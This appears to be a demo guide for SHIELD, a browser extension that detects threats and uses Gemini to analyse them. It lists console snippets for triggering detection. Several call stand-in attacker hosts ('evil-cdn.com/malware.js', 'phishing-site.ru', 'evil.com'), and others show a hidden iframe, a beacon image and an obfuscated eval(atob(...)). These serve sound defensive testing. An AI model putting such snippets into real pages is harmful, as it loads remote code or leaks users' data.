# 🎬 SHIELD Demo Guide

## Table of Contents

- [Quick Start](#quick-start)
- [Demo Scenarios](#demo-scenarios)
- [Testing Commands](#testing-commands)
- [Expected Behaviors](#expected-behaviors)
- [Troubleshooting](#troubleshooting)
- [Advanced Testing](#advanced-testing)

## Quick Start

### Prerequisites
- ✅ SHIELD extension installed and configured
- ✅ Google Gemini API key set up
- ✅ Chrome Developer Tools access

### Basic Demo Flow

1. **Open Test Page**: Navigate to any website (e.g., ``)
2. **Open Console**: Press `F12` → Click "Console" tab
3. **Trigger Threat**: Run one of the test commands below
4. **Observe Detection**: Watch SHIELD icon for alerts
5. **Analyze Threat**: Click extension → "Analyze with Gemini"
6. **Take Action**: Use controls to disable suspicious extensions

## Demo Scenarios

### Scenario 1: Network-Based Threats
**Objective**: Demonstrate detection of suspicious network activity

**Steps:**
1. Open `https://httpbin.org` (safe testing site)
2. Open Developer Console
3. Execute network threat commands
4. Observe SHIELD detection and analysis

**Expected Outcome:**
- Risk score increases to MEDIUM/HIGH
- Network threats appear in threat list
- Gemini provides detailed security analysis

### Scenario 2: DOM Manipulation Attacks
**Objective**: Show detection of malicious script injections

**Steps:**
1. Open `https://example.com`
2. Open Developer Console
3. Execute DOM injection commands
4. Monitor real-time threat detection

**Expected Outcome:**
- Immediate threat detection
- HIGH severity alerts
- Detailed injection information displayed

### Scenario 3: Combined Attack Simulation
**Objective**: Demonstrate multi-vector threat handling

**Steps:**
1. Open test website
2. Execute multiple threat types in sequence
3. Observe cumulative risk scoring
4. Test AI analysis of complex threats

**Expected Outcome:**
- Escalating risk scores
- Multiple threat types in log
- Comprehensive AI threat assessment

## Testing Commands

### Network Threats

#### IP Address Access (HIGH RISK)
```javascript
// Direct IP access - highly suspicious
fetch('http://192.168.1.100/malicious')
  .then(r => r.text())
  .then(d => console.log('IP access successful'));
```

#### Unknown Domain (MEDIUM RISK)
```javascript
// Access to unknown/suspicious domain
fetch('https://suspicious-malware-site-12345.com/api')
  .catch(e => console.log('Blocked or suspicious domain'));
```

#### High-Frequency Requests (MEDIUM RISK)
```javascript
// Rapid requests to same domain
for(let i = 0; i < 10; i++) {
  fetch('https://httpbin.org/delay/1')
    .then(() => console.log(`Request ${i+1} completed`));
}
```

### DOM Injection Threats

#### Script Injection (HIGH RISK)
```javascript
// Inject malicious script
const script = document.createElement('script');
script.src = 'https://evil-cdn.com/malware.js';
script.onload = () => console.log('Malicious script loaded');
document.head.appendChild(script);
```

#### Iframe Injection (HIGH RISK)
```javascript
// Inject hidden iframe
const iframe = document.createElement('iframe');
iframe.src = 'https://phishing-site.ru';
iframe.style.display = 'none';
document.body.appendChild(iframe);
```

#### Dynamic Script Creation (HIGH RISK)
```javascript
// Create script element dynamically
const maliciousScript = document.createElement('script');
maliciousScript.textContent = 'console.log("Malicious code executed")';
document.body.appendChild(maliciousScript);
```

### Advanced Threats

#### XMLHttpRequest Monitoring
```javascript
// Test XMLHttpRequest interception
const xhr = new XMLHttpRequest();
xhr.open('GET', 'http://192.168.1.200/api/data');
xhr.onload = () => console.log('XHR completed');
xhr.send();
```

#### Mixed Threat Pattern
```javascript
// Combine multiple threat types
fetch('http://10.0.0.1:8080/cmd');
document.body.appendChild(document.createElement('iframe'));
```

## Expected Behaviors

### UI Responses

#### Clean State
```
🛡️ SHIELD
Risk Score: 0 LOW
Threats Detected: 0
No threats detected. You're safe! ✅
```

#### After Network Threat
```
🛡️ SHIELD
Risk Score: 40 MEDIUM
Threats Detected: 1

NETWORK THREAT MEDIUM
Domain: 192.168.1.100
Type: Direct IP address access
Score: +40
```

#### After DOM Injection
```
🛡️ SHIELD
Risk Score: 40 HIGH
Threats Detected: 1

DOM INJECTION HIGH
Type: SCRIPT_INJECTION
Details: script element injected
Score: +40
```

### Gemini Analysis Examples

#### Network Threat Analysis
```
"This appears to be a suspicious network connection. Direct IP address access
bypasses domain name resolution and may indicate communication with a command
and control server or unauthorized internal network access."
```

#### DOM Injection Analysis
```
"Script injection detected. This is a common attack vector where malicious
JavaScript is inserted into web pages to steal data, redirect users, or
execute unauthorized code. Immediate investigation recommended."
```

## Troubleshooting

### Extension Not Detecting Threats

**Problem**: Commands executed but no threats shown
**Solutions**:
- ✅ Check if extension is enabled in `chrome://extensions/`
- ✅ Verify content scripts are injected (DevTools → Application → Frames)
- ✅ Try refreshing the page and re-executing commands
- ✅ Check browser console for SHIELD error messages

### Gemini Analysis Not Working

**Problem**: "Gemini integration not loaded" error
**Solutions**:
- ✅ Verify API key is configured correctly
- ✅ Check internet connection
- ✅ Confirm API key has sufficient quota
- ✅ Look for CORS or network errors in console

### Risk Score Not Updating

**Problem**: Threats detected but score remains 0
**Solutions**:
- ✅ Check browser console for JavaScript errors
- ✅ Verify background service worker is running
- ✅ Try clearing threats and re-testing
- ✅ Check extension permissions in `chrome://extensions/`

### UI Not Updating

**Problem**: Threats detected but popup doesn't refresh
**Solutions**:
- ✅ Click popup again to force refresh
- ✅ Check for JavaScript errors in popup console
- ✅ Verify message passing between components
- ✅ Try restarting Chrome

## Advanced Testing

### Performance Testing

#### Memory Leak Test
```javascript
// Execute many threats to test memory management
for(let i = 0; i < 200; i++) {
  setTimeout(() => {
    fetch('http://192.168.1.' + (i % 255) + '/test');
  }, i * 100);
}
```

#### Stress Test
```javascript
// Rapid-fire multiple threat types
setInterval(() => {
  fetch('http://10.0.0.' + Math.floor(Math.random() * 255));
  document.body.appendChild(document.createElement('script'));
}, 1000);
```

### Integration Testing

#### Cross-Origin Requests
```javascript
// Test CORS behavior with suspicious requests
fetch('https://evil.com/api', {
  method: 'POST',
  body: JSON.stringify({data: 'test'})
});
```

#### WebSocket Connections
```javascript
// Test WebSocket monitoring (if implemented)
const ws = new WebSocket('ws://192.168.1.100:8080');
ws.onopen = () => console.log('Suspicious WebSocket opened');
```

### Security Testing

#### Evasion Attempts
```javascript
// Try to bypass detection
const img = document.createElement('img');
img.src = 'http://192.168.1.100/beacon.gif';
document.body.appendChild(img);
```

#### Obfuscated Threats
```javascript
// Test detection of encoded threats
eval(atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKSk='));
```

## Demo Script Template

### For Presentations

```markdown
# SHIELD Live Demo

## Introduction (30 seconds)
- Show clean dashboard
- Explain real-time monitoring concept

## Threat Detection (2 minutes)
1. Execute IP address command
2. Show immediate detection
3. Demonstrate risk score increase

## AI Analysis (1 minute)
1. Click "Analyze with Gemini"
2. Show AI-powered explanation
3. Explain security implications

## Mitigation (1 minute)
1. Demonstrate extension disabling
2. Show threat clearance
3. Return to clean state

## Q&A (2 minutes)
- Address audience questions
- Show additional test commands
```

### Automated Demo Script

```javascript
// Automated demo sequence
async function runDemo() {
  console.log('🚀 Starting SHIELD Demo...');

  // Phase 1: Network threat
  console.log('📡 Testing network threat detection...');
  await fetch('http://192.168.1.100/demo');
  await new Promise(r => setTimeout(r, 2000));

  // Phase 2: DOM injection
  console.log('💉 Testing DOM injection detection...');
  document.body.appendChild(document.createElement('script'));
  await new Promise(r => setTimeout(r, 2000));

  // Phase 3: Multiple threats
  console.log('🎯 Testing combined threats...');
  fetch('https://suspicious-site-12345.com/api');
  document.body.appendChild(document.createElement('iframe'));

  console.log('✅ Demo sequence completed!');
}

runDemo();
```

This comprehensive demo guide ensures you can effectively showcase SHIELD's capabilities in any presentation or testing scenario.